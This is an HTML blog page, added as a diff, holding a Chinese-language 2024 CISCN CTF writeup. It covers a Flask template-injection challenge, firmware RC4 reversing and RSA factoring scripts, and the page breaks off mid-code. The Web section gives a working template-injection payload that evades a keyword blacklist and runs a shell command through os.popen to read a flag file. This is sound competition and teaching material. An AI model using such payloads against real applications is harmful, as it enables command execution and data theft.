@@ -1,0 +1,802 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412222328446.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="XU17">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2024 CISCN CCB Writeup by XU17">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024-CISCN-XU17">
+<meta property="og:url" content="http://example.com/2024/12/15/2024-CISCN-XU17/index.html">
+<meta property="og:site_name" content="XU17">
+<meta property="og:description" content="2024 CISCN CCB Writeup by XU17">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241829302.jpg">
+<meta property="article:published_time" content="2024-12-15T13:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-24T10:30:41.478Z">
+<meta property="article:author" content="XU17">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241829302.jpg">
+  
+  
+  
+  <title>2024-CISCN-XU17 - XU17</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>XU17&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241829302.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024-CISCN-XU17"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-15 21:00" pubdate>
+          2024年12月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024-CISCN-XU17</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241829302.jpg" srcset="/img/loading.gif" lazyload alt="20241104kUSnH7it5x"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Safe-proxy"><a href="#Safe-proxy" class="headerlink" title="Safe_proxy"></a>Safe_proxy</h3><p>访问页面，得到源码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> html<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    template_code = request.form.get(<span class="hljs-string">&quot;code&quot;</span>)<br>    <span class="hljs-comment"># 安全过滤</span><br>    blacklist = [<span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>]<br>    <span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> black <span class="hljs-keyword">in</span> template_code:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden content detected!&quot;</span><br>    result = render_template_string(template_code)<br>    <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span> <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;error&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPProxyHandler</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_host, target_port</span>):<br>        <span class="hljs-variable language_">self</span>.target_host = target_host<br>        <span class="hljs-variable language_">self</span>.target_port = target_port<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>(<span class="hljs-params">self, client_socket</span>):<br>        <span class="hljs-keyword">try</span>:<br>            request_data = <span class="hljs-string">b&quot;&quot;</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                chunk = client_socket.recv(<span class="hljs-number">4096</span>)<br>                request_data += chunk<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(chunk) &lt; <span class="hljs-number">4096</span>:<br>                    <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request_data:<br>                client_socket.close()<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> proxy_socket:<br>                proxy_socket.connect((<span class="hljs-variable language_">self</span>.target_host, <span class="hljs-variable language_">self</span>.target_port))<br>                proxy_socket.sendall(request_data)<br><br>                response_data = <span class="hljs-string">b&quot;&quot;</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    chunk = proxy_socket.recv(<span class="hljs-number">4096</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk:<br>                        <span class="hljs-keyword">break</span><br>                    response_data += chunk<br><br>            header_end = response_data.rfind(<span class="hljs-string">b&quot;\r\n\r\n&quot;</span>)<br>            <span class="hljs-keyword">if</span> header_end != -<span class="hljs-number">1</span>:<br>                body = response_data[header_end + <span class="hljs-number">4</span>:]<br>            <span class="hljs-keyword">else</span>:<br>                body = response_data<br>                <br>            response_body = body<br>            response = <span class="hljs-string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Length: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(response_body)).encode() + <span class="hljs-string">b&quot;\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;\r\n&quot;</span> + response_body<br><br>            client_socket.sendall(response)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">finally</span>:<br>            client_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_proxy_server</span>(<span class="hljs-params">host, port, target_host, target_port</span>):<br>    proxy_handler = HTTPProxyHandler(target_host, target_port)<br>    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    server_socket.bind((host, port))<br>    server_socket.listen(<span class="hljs-number">100</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy server is running on <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span> and forwarding to <span class="hljs-subst">&#123;target_host&#125;</span>:<span class="hljs-subst">&#123;target_port&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client_socket, addr = server_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Connection from <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br>            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))<br>            thread.daemon = <span class="hljs-literal">True</span><br>            thread.start()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Shutting down proxy server...&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        server_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_flask_app</span>():<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    proxy_host = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    proxy_port = <span class="hljs-number">5001</span><br>    target_host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    target_port = <span class="hljs-number">5000</span><br><br>    <span class="hljs-comment"># 安全反代，防止针对响应头的攻击</span><br>    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))<br>    proxy_thread.daemon = <span class="hljs-literal">True</span><br>    proxy_thread.start()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting Flask app...&quot;</span>)<br>    run_flask_app()<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li>
+<li>把<code>flag</code>重定向到<code>app.py</code>上</li>
+<li>绕过<code>blacklist = [&#39;__&#39;, &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;eval&#39;, &#39;subprocess&#39;, &#39;popen&#39;, &#39;system&#39;, &#39;\r&#39;, &#39;\n&#39;]</code></li>
+<li><code>__ -&gt; &#39;_&#39;+&#39;_&#39;</code></li>
+<li><code>os -&gt; &#39;o&#39;+&#39;s&#39;</code></li>
+</ul>
+<p>最终<code>payload</code>如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">code=&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;globals&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;builtins&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> c=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;impo&#x27;</span><span class="hljs-string">&#x27;rt&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> d=<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>%&#125;&#123;&#123;cycler.<span class="hljs-built_in">next</span>[a][b][c](d)[<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat ../../../flag &gt; app.py&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826160.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>回退</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826093.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezCsky"><a href="#ezCsky" class="headerlink" title="ezCsky"></a>ezCsky</h3><ul>
+<li>固件分析，<code>Motorola RCE</code>架构，<code>ida7.7</code>里没有对应的<code>type</code>，一个个试找了一个反编译效果最好的</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826033.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>能识别出来的函数只有几个</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826991.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li><p>但是去翻翻看，能看到一个rc4_encrypt,cmp_result,main,大概能猜到意思</p>
+</li>
+<li><p>在main里翻到了几个特征串，大概理清了流程</p>
+</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826011.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li><p>用<code>“testkey”</code>进行<code>rc4</code>加密，在<code>cmp</code>中进行比较，密文在<code>unk_8AA0</code>里，往下面翻翻就能看到</p>
+</li>
+<li><p>去网站解密后，发现还不太对</p>
+</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826019.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>发现最后一个是}，考虑还有个<code>xor</code>没用上，猜测是一个前后异或，回去读一读，大概对的上</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826592.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;d0f5b330-9a74-11ef-9afd-acde48001122&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rasnd"><a href="#rasnd" class="headerlink" title="rasnd"></a>rasnd</h3><ul>
+<li>第一部分 分析代码，得到如下关系</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">h1</span> = x1*p + y1 *q - <span class="hljs-number">0</span>x114<br><span class="hljs-attr">h2</span> = x2*p +y2 * q - <span class="hljs-number">0</span>x514<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>消去<code>p</code>后，只需要爆破<code>h1、h2</code>即可</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br>c = <span class="hljs-number">2047025302632489558157986377411562383750242098507101091835107604805413439963651499324666753537268662411798999353368521616537455619541474396664247770819403320179057671372599818892198417715189001567277409117783983748271235004737860935969497729693964275961990646245389724322432112287310417469924363937852078540410479502868130356098508588355727424707732912060661787647639381326829675883881765220953147603356174168805562685038102366234920340464587909256209275021059297167327887262581448148603906439400710107536951684459877024176259067449629350804430963362618693698322831473282809815790044861282591070783004510688686543536</span><br>n = <span class="hljs-number">15920173700664937533872551211373259839660299468835236200963406447246081490116425338346880175793432609104986652164487679573546435542663593978091836423227699351391038307254973165725055211012599604697598457965776845260944492561088472287304875941686160337835563398666657256280956343977084300347919352519507817390748959649985567022862236579500096654959197540691900743410585789944175259198342315278161373891512170975014764014690048430767176042774918769605948250968099683007673337011895410534198101814351729062810555709406291719644174553645729624040667677828580430395394166441608908794433481917739937056295583112550096842829</span><br>a = <span class="hljs-number">1788191443423648314996962441836187430188972565635381393376017463408135062887872327752852694837772510240051857039862516257168171180534813011888460306819202855254313812259002208708003315009272616637706145101210351906671428324238878097469011217517290793242097541951393761641647697870262022422080159421238248852236227711616142536087708611893231058</span><br>b = <span class="hljs-number">4889435575009813953150459835380031496142967222940678447969658749487294768373783678917852904447599308535099664667524504039245726024439182695980458708722618855136931457891616586649484629257141009693449457099695131583806787115459724479919725740229105715779481332474441933271505987533267210176224331187382523048267185202782555789943574792505715301119230102640163860970042097004807825585559573355461122118412971402964101893600100934904032951444699944229492743037419616</span><br>e = <span class="hljs-number">0x10001</span><br><br><span class="hljs-keyword">for</span> x1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>,<span class="hljs-number">2</span>**<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">for</span> x2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>,<span class="hljs-number">2</span>**<span class="hljs-number">11</span>):<br>        k = (b+<span class="hljs-number">0x514</span>)*x1 - (a+<span class="hljs-number">0x114</span>)*x2<br>        <br>        <span class="hljs-keyword">if</span>(gcd(k,n) &gt;<span class="hljs-number">1</span> &amp; gcd(k,n)&lt;n-<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">print</span>(gcd(k,n))<br>            q = gcd(k,n)<br><br>q = <span class="hljs-number">129713873839145334329392401371189963777712190897978816709235924556672196006347844671068464026219117804812297989197327919408459177096469030481019240080779880761097280806029355911233146512712582901895037850147815390703479188070631638892905175053709386715345561960074809966193484477155806599143328718289066817237</span><br>p = n//q<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(p*q ==n)<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(phi)<br>d = invert(e,phi)<br>m= <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>第二部分<ul>
+<li>分析得到：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">h = <span class="hljs-built_in">pow</span>(<span class="hljs-number">514</span>`*`<span class="hljs-selector-tag">p</span> - <span class="hljs-number">114</span>`*`<span class="hljs-selector-tag">q</span>, n - <span class="hljs-selector-tag">p</span> - <span class="hljs-selector-tag">q</span>, n) <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>由<code>pow(a,phi,n) = 1(a、n互素)</code>得<code>h = pow(514</code><em><code>p-114</code></em><code>q , -1 , n)</code></p>
+</li>
+<li><p>求逆元，求出<code>514</code><em><code>p-114</code></em><code>q</code>后联立<code>n = p *q</code> 即可</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">extended_gcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    gcd, x1, y1 = extended_gcd(b % 